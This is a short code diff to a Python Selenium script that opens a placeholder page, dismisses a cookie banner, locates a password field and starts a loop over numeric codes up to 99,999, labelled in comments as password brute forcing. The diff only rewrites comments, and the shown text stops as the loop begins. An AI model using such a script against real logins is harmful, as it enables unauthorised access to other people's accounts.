@@ -3,6 +3,7 @@ from selenium.webdriver.common.by import By
 import time
 if __name__ == '__main__':
     browser = webdriver.Chrome('/Users/sergey/Downloads/chromedriver')
+    #GETTING PATH TO THE INPUT
     browser.get('PAGE_LINK')
     acceptcookies = browser.find_element(By.XPATH, "//*[@id=\"onetrust-button-group\"]/div")
     time.sleep(2)
@@ -14,8 +15,7 @@ if __name__ == '__main__':
     time.sleep(2)
     passwordfield = browser.find_element(By.XPATH, "//*[@id=\"slide-password-wrapper-ca9b7634-e002-40f2-b6c3-cca0ad285c3d\"]/div/div/div/form/div/div[1]/input")
     time.sleep(2)                      
-    #Code before this line describes path to the password field
-    #Code below describes password brute forcing 
+    #START OF BRUTEFORCING 
     time.sleep(2)
     for i in range(0, 100000):
         t = i #Temp. variable to count number of digits needed to be cover with zeroes
